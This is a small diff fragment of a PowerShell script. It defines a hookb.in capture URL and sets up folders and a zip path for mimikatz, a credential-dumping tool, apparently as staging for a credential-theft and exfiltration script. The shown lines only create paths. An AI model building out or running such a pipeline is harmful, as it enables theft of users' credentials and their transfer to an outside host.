@@ -3,8 +3,9 @@ Add-Type -AssemblyName System.Web
 
 $uri_hookbin = "https://hookb.in/ZV8Od8Bd"
 $repo_path = "$HOME/Desktop/ok"
-mkdir $repo_path > $null 2>&1
-mkdir $mimikatz_path > $null 2>&1
+$mimikatz_path = "$repo_path/mimikatz"
+
+mkdir -p $mimikatz_path > $null 2>&1
 $mimikatz_zip_path = "$repo_path/mimikatz.zip"
 $mimikatz_path = "$repo_path/mimikatz"
 
